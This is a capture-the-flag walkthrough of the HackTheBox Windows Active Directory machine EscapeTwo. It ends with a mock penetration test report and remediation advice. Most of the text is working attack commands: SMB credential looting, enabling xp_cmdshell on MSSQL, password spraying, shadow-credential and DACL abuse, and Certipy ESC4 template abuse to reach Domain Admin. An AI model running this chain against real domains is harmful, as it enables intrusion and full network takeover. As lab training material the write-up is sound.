---
title: EscapeTwo HTB — Full Walkthrough
published: 2025-06-29
description: A comprehensive guide to solving the EscapeTwo HTB Windows Active Directory box, detailing reconnaissance, SMB exploitation, MSSQL abuse, and privilege escalation to Domain Admin.
tags: [HTB, Active Directory, SMB, MSSQL, Privilege Escalation, Windows, CTF]
category: Walkthrough
draft: true
---

# EscapeTwo HTB — Full Walkthrough

**Difficulty:** Easy

**Platform:** HackTheBox

**Target:** Windows (Active Directory)

**Objective:** Gain Domain Admin access and capture flags

## 1. Reconnaissance

Perform a full TCP port scan with service and version detection:  
```bash
nmap -p- -sV -sC -O 10.10.11.51 -o nmapScan.txt
```

**Findings:**  
- Key ports: 445 (SMB), 389 (LDAP), 88 (Kerberos), 1433 (MSSQL).  
- Identified as a Windows Server 2019 Active Directory environment.

## 2. Initial Access

Using provided credentials (`rose:KxEPkKe6R8su`), enumerate SMB shares:  
```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

**Findings:**  
- Accessible share: `Accounting Department` (READ).

Access the share:  
```bash
smbclient //10.10.11.51/Accounting\ Department -U 'rose'
```

**Files Found:**  
- `accounts.xlsx`  
- `accounting_2024.xlsx`

Download and inspect files:  
```bash
get accounts.xlsx
get accounting_2024.xlsx
file accounts.xlsx
```

Unzip Excel files and extract credentials from `xl/sharedStrings.xml`:  
```bash
xmlstarlet sel -t -m "//si" -v "t" -n accounts.xml | awk 'NR<=5 {header[NR]=$0; next} {printf "%s\t", $0; if (NR%5==0) print ""}'
```

**Credentials Found:**  
- **Username:** sa  
- **Password:** MSSQLP@ssw0rd!

## 3. MSSQL Enumeration

Test MSSQL credentials:  
```bash
nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth
```

Connect to MSSQL:  
```bash
python3 mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

Verify MSSQL version:  
```sql
SELECT @@version;
```

List databases:  
```sql
SELECT name FROM sys.databases;
```

Check `xp_cmdshell` status:  
```sql
EXEC sp_configure 'xp_cmdshell';
```

Enable `xp_cmdshell` if disabled:  
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Execute system command:  
```sql
EXEC xp_cmdshell 'whoami';
```

## 4. File Discovery

Search for `.txt` files:  
```sql
EXEC xp_cmdshell 'dir C:\*txt /s';
```

No useful `.txt` files found. Search other directories:  
```sql
EXEC xp_cmdshell 'dir C:\SQL2019 /s';
```

**Findings:** Configuration file `C:\SQL2019\ExpressAdv_ENV\sql-Configuration.INI`.  
Read the file:  
```sql
EXEC xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENV\sql-Configuration.INI';
```

**Credentials Found:**  
- **Password:** WqSZAF6CysDQbGb3 (invalid for `sa`).

## 5. Password Spraying

Enumerate AD users:  
```bash
nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --users
```

Save usernames to `adusers.txt`. Perform password spraying:  
```bash
nxc winrm 10.10.11.51 -u adusers.txt -p 'WqSZAF6CysDQbGb3'
```

**Valid Credentials Found:**  
- **Username:** ryan  
- **Password:** WqSZAF6CysDQbGb3

Login as `ryan` using WinRM:  
```bash
evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

Capture user flag:  
```bash
cd Desktop
type user.txt
```

## 6. BloodHound Enumeration

Upload and run SharpHound:  
```bash
upload SharpHound.exe
.\SharpHound.exe --CollectionMethods All --ZipFileName output.zip
download output.zip
```

Analyze with BloodHound to identify privilege escalation paths.

## 7. Privilege Escalation via Certificate Abuse

Modify ownership of `ca_svc` using `owneredit.py`:  
```bash
sudo nano /etc/hosts
# Add: 10.10.11.51 sequel.htb
python3 owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

Grant `ryan` full control over `ca_svc`:  
```bash
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

Enroll certificate for `ca_svc`:  
```bash
python3 pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" --target "ca_svc" --action "add"
```

**Output:**  
- **Key:** vfPE5BZG.pfx  
- **Password:** nODWEZzArQr6E3i5wbpl

Obtain TGT and NT hash:  
```bash
python3 PKINITtools/gettgtpkinit.py sequel.htb/ca_svc -cert-pfx vfPE5BZG.pfx -pfx-pass nODWEZzArQr6E3i5wbpl -dc-ip 10.10.11.51 escapetwo
```

**TGT:** 5d900ae62fe0eb483b9890d0902355618053e5325b9bf38752c2580d67dffbfb

Extract NT hash:  
```bash
python3 PKINITtools/getnthash.py sequel.htb/ca_svc -key 5d900ae62fe0eb483b9890d0902355618053e5325b9bf38752c2580d67dffbfb -dc-ip 10.10.11.51
```

**NT Hash:** 3b181b914e7a9d5508ea1e20bc2b7fce

## 8. Domain Admin Access

Discover certificate templates:  
```bash
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -debug
```

Modify vulnerable template:  
```bash
certipy-ad template -template DunderMifflinAuthentication -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -debug -save-old
```

Confirm template vulnerabilities:  
```bash
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -vulnerable
```

Apply template to CA server:  
```bash
certipy-ad template -dc-ip 10.10.11.51 -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target DC01.sequel.htb -save-old
```

Request certificate as Administrator:  
```bash
certipy-ad req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb -dns dc01.sequel.htb -debug
```

Authenticate as Administrator:  
```bash
certipy-ad auth -pfx administrator_dc01.pfx
```

Login as Administrator:  
```bash
evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

Capture root flag:  
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

## Lessons Learned

- SMB shares can expose sensitive data like credentials in Excel files.  
- MSSQL misconfigurations, such as enabled `xp_cmdshell`, allow command execution.  
- Password reuse across accounts enables lateral movement.  
- ADCS misconfigurations (ESC4) can lead to domain compromise via certificate abuse.  
- Tools like `Impacket`, `Certipy`, and `SharpHound` are critical for AD enumeration and exploitation.  
- Thorough enumeration of files and configurations is key to uncovering escalation paths.

## Penetration Test Report

**Client:** HTB

**Engagement:** Penetration Test - Windows Active Directory Environment

**Date:** June 2025

**Consultant:** Hugo Leonor

### 1. Objective

Assess the security of the Windows Active Directory environment at `10.10.11.51`, identifying vulnerabilities leading to privilege escalation and Domain Admin compromise.

### 2. Scope

- **Target IP:** 10.10.11.51  
- **Services:** SMB, LDAP, Kerberos, MSSQL, WinRM  
- **Initial Access:** Provided credentials (`rose:KxEPkKe6R8su`)  

### 3. Methodology

Followed a structured Active Directory penetration test approach:  
- Reconnaissance with Nmap and SMB enumeration  
- Exploitation of SMB shares and MSSQL for credential extraction  
- Password spraying and lateral movement  
- ADCS abuse for privilege escalation  
- BloodHound analysis for domain enumeration  

### 4. Summary of Findings

| Stage | Key Result | Impact |
|-------|------------|--------|
| Initial Scan | AD ports (445, 389, 88, 1433) open | Normal exposure |
| SMB Enumeration | Access to Accounting Department share, credentials in Excel files | Initial foothold |
| MSSQL Abuse | `sa` credentials, enabled `xp_cmdshell` for file discovery | System access |
| Password Spraying | Valid credentials for `ryan` | Lateral movement |
| Certificate Abuse | Exploited ADCS misconfiguration (ESC4) | Domain Admin access |
| Root Flag Capture | Administrator shell, root flag obtained | Total compromise |

### 5. Technical Details

#### 5.1 Reconnaissance and Enumeration

Exposed AD services and SMB shares revealed credentials in Excel files, leading to MSSQL access.

#### 5.2 Initial Access and MSSQL Exploitation

MSSQL credentials (`sa:MSSQLP@ssw0rd!`) allowed command execution via `xp_cmdshell`, uncovering additional credentials in configuration files.

#### 5.3 Lateral Movement and Escalation

Password spraying identified `ryan`’s credentials, enabling WinRM access. ADCS misconfigurations were exploited to gain Domain Admin privileges via certificate abuse.

### 6. Impact and Risks

- **Domain Compromise:** Full control over the AD environment.  
- **Credential Exposure:** Plaintext credentials in files and shares.  
- **MSSQL Misconfiguration:** Enabled command execution, escalating access.  
- **ADCS Vulnerabilities:** Facilitated privilege escalation to Domain Admin.  

### 7. Recommendations

- Restrict SMB share access and remove sensitive data from shares.  
- Disable `xp_cmdshell` on MSSQL or enforce least privilege for accounts.  
- Implement strong, unique passwords and monitor for reuse.  
- Audit and secure ADCS configurations to prevent certificate abuse.  
- Use BloodHound to identify and remediate privilege escalation paths.  
- Enable multi-factor authentication and regular AD security audits.